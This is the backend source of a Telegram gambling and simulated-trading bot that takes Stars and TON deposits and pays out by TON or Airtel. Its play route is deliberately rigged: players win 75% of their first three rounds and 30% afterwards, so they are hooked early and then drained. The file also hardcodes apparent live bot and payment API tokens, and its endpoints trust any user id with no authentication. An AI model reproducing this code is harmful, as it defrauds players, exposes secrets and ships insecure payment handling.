/**
 * STARRUSSI ULTIMATE V6 - BACKEND CORE
 * Developer: Nour Edition
 * Features: High Frequency Trading Sim, Adaptive Odds, Auto-Save
 */

const express = require('express');
const axios = require('axios');
const fs = require('fs');
const cors = require('cors');
const path = require('path');

const app = express();
app.use(express.json());
app.use(cors());
app.use(express.static(__dirname));

// --- CONFIGURATION CRITIQUE ---
const CONFIG = {
    BOT_TOKEN: '8554964276:AAFXlTNSQXWQy8RhroiqwjcqaSg7lYzY9GU',
    CRYPTO_TOKEN: '510513:AAeEQr2dTYwFbaX56NPAgZluhSt34zua2fc',
    ADMIN_ID: '7019851823',
    BOT_USERNAME: 'Newspin_onebot',
    CHANNEL_ID: '@starrussi',
    TON_TO_FCFA: 1100,
    MIN_WITHDRAW_TON: 1.0,
    MIN_WITHDRAW_AIRTEL: 3.0,
    MIN_DEPOSIT_STARS: 5,
    MIN_DEPOSIT_TON: 0.2
};

const DB_FILE = './database.json';
let db = fs.existsSync(DB_FILE) ? JSON.parse(fs.readFileSync(DB_FILE, 'utf8')) : {};

const saveDB = () => {
    try {
        fs.writeFileSync(DB_FILE, JSON.stringify(db, null, 2));
    } catch (e) { console.error("DB Save Error:", e); }
};

// Initialisation Utilisateur avec Persistance d'état
const initUser = (id, username = "Ghost", refId = null) => {
    const sId = id.toString();
    if (!db[sId]) {
        db[sId] = {
            id: sId,
            username: username,
            balance: 0.10, // Welcome Bonus
            stats: { played: 0, wins: 0, losses: 0 },
            tasks: { joined_channel: false },
            history: [],
            invited_by: refId,
            created_at: new Date().toISOString()
        };
        // Logique de parrainage
        if (refId && db[refId] && refId !== sId) {
            db[refId].balance += 0.05;
            db[refId].history.unshift({ type: 'REF', amount: 0.05, detail: `New referral: ${username}` });
        }
        saveDB();
    }
    return db[sId];
};

// --- ROUTES API ---

app.post('/api/sync', (req, res) => {
    const { id, username, refId } = req.body;
    const user = initUser(id, username, refId);
    res.json({ success: true, user, refLink: `https://t.me/${CONFIG.BOT_USERNAME}?start=${id}` });
});

// Système de Trading et Jeux avec Algorithme de Difficulté (Nour Request)
app.post('/api/action/play', (req, res) => {
    const { id, bet, game, type } = req.body; // type: 'up'/'down' for trade
    const user = db[id.toString()];
    const amount = parseFloat(bet);

    if (!user || user.balance < amount) return res.json({ success: false, message: "Balance Insuffisante" });

    // Déduction immédiate pour éviter la triche en rafraîchissant
    user.balance -= amount;
    user.stats.played += 1;

    let win = 0;
    let result = null;

    // ALGORITHME NOUR: Gagner au début, puis 70% de perte après 3 tours
    const winChance = user.stats.played <= 3 ? 0.75 : 0.30; 
    const isWinner = Math.random() < winChance;

    if (game === 'trade') {
        result = isWinner ? type : (type === 'up' ? 'down' : 'up');
        if (isWinner) win = amount * 1.90;
    } else if (game === 'dice') {
        result = isWinner ? (Math.floor(Math.random() * 3) + 4) : (Math.floor(Math.random() * 3) + 1);
        if (result >= 4) win = amount * 1.80;
    } else if (game === 'slots') {
        const icons = ['💎', '🍒', '7️⃣', '🍀'];
        result = isWinner ? [icons[0], icons[0], icons[0]] : [icons[0], icons[1], icons[2]];
        if (isWinner) win = amount * 5;
    }

    user.balance += win;
    if (win > 0) user.stats.wins += 1; else user.stats.losses += 1;
    
    user.history.unshift({
        type: win > 0 ? 'WIN' : 'LOSS',
        amount: win > 0 ? win : -amount,
        detail: `Game: ${game}`,
        time: new Date().toLocaleTimeString()
    });

    saveDB();
    res.json({ success: true, win, result, balance: user.balance });
});

// Dépôt STARS Séparé
app.post('/api/deposit/stars', async (req, res) => {
    const { id, amount } = req.body;
    if (amount < CONFIG.MIN_DEPOSIT_STARS) return res.json({ success: false, message: `Min: ${CONFIG.MIN_DEPOSIT_STARS} Stars` });
    try {
        const r = await axios.post(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/createInvoiceLink`, {
            title: "Recharge Stars", description: "Top-up Credits", payload: `STARS_${id}`,
            currency: "XTR", prices: [{ label: "Stars", amount: parseInt(amount) }]
        });
        res.json({ success: true, url: r.data.result });
    } catch (e) { res.json({ success: false }); }
});

// Dépôt TON CryptoBot Séparé
app.post('/api/deposit/ton', async (req, res) => {
    const { id, amount } = req.body;
    if (amount < CONFIG.MIN_DEPOSIT_TON) return res.json({ success: false, message: `Min: ${CONFIG.MIN_DEPOSIT_TON} TON` });
    try {
        const r = await axios.post('https://pay.crypt.bot/api/createInvoice', {
            asset: 'TON', amount: amount.toString(), payload: id.toString()
        }, { headers: { 'Crypto-Pay-API-Token': CONFIG.CRYPTO_TOKEN } });
        res.json({ success: true, url: r.data.result.pay_url });
    } catch (e) { res.json({ success: false }); }
});

// Retrait Professionnel avec Notification Admin
app.post('/api/withdraw', async (req, res) => {
    const { id, amount, method, details } = req.body;
    const user = db[id.toString()];
    const amt = parseFloat(amount);
    const min = method === 'AIRTEL' ? CONFIG.MIN_WITHDRAW_AIRTEL : CONFIG.MIN_WITHDRAW_TON;

    if (amt < min || user.balance < amt) return res.json({ success: false, message: "Solde ou montant invalide" });

    user.balance -= amt;
    const fcfa = (amt * CONFIG.TON_TO_FCFA).toFixed(0);
    const adminMsg = `🚨 *WITHDRAWAL REQUEST*\nUser: ${user.username} (${id})\nAmount: ${amt} TON (${fcfa} FCFA)\nMethod: ${method}\nDetails: ${details}`;

    try {
        await axios.post(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, { chat_id: CONFIG.ADMIN_ID, text: adminMsg, parse_mode: 'Markdown' });
        user.history.unshift({ type: 'WITHDRAW', amount: -amt, detail: method });
        saveDB();
        res.json({ success: true, message: "Demande envoyée à l'administrateur !" });
    } catch (e) { res.json({ success: false }); }
});

// Vérification de la tâche Canal @starrussi
app.post('/api/verify-task', async (req, res) => {
    const { id } = req.body;
    const user = db[id.toString()];
    try {
        const check = await axios.get(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/getChatMember?chat_id=${CONFIG.CHANNEL_ID}&user_id=${id}`);
        const status = check.data.result.status;
        if (['member', 'administrator', 'creator'].includes(status) && !user.tasks.joined_channel) {
            user.balance += 0.20;
            user.tasks.joined_channel = true;
            saveDB();
            return res.json({ success: true, message: "Bonus 0.20 TON ajouté !" });
        }
        res.json({ success: false, message: "Veuillez rejoindre le canal d'abord." });
    } catch (e) { res.json({ success: false }); }
});

app.listen(3000, () => console.log(">>> STARRUSSI V6 RUNNING ON PORT 3000"));
